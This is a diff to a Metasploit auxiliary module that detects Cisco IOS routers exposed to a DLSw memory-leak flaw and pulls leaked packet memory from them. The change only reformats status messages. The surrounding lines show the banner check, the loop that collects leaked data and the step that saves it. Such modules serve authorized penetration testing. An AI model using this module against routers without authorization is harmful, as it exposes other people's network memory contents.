@@ -45,13 +45,13 @@ class Metasploit3 < Msf::Auxiliary
 
   # Called when using check
   def check_host(ip)
-    print_status "Checking #{ip}:#{rport} for DLSw exposure"
+    print_status "#{ip}:#{rport} Checking for DLSw exposure"
     connect
     response = sock.recv(1024)
     disconnect
 
     if (response.length > 0) && (response =~ /IOS Software|cisco.com/)
-     print_status("The target Cisco router appears vulnerable, we detected parts of a Cisco IOS banner string emitted from #{ip}:#{rport}")
+     print_status("#{ip}:#{rport} The target Cisco router appears vulnerable, parts of a Cisco IOS banner were emitted")
      report_vuln({
         :host => rhost,
         :port => rport,
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
-    print_status("Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes from #{ip}:#{rport}")
+    print_status("#{ip}:#{rport} Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes")
 
     dlsw_data = ""
     until dlsw_data.length > datastore['LEAK_AMOUNT']
@@ -92,7 +92,7 @@ class Metasploit3 < Msf::Auxiliary
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
-    print_status("DLSw leaked data from #{ip}:#{rport} stored in #{path}")
+    print_status("#{ip}:#{rport} DLSw leaked data stored in #{path}")
   end
 end
 
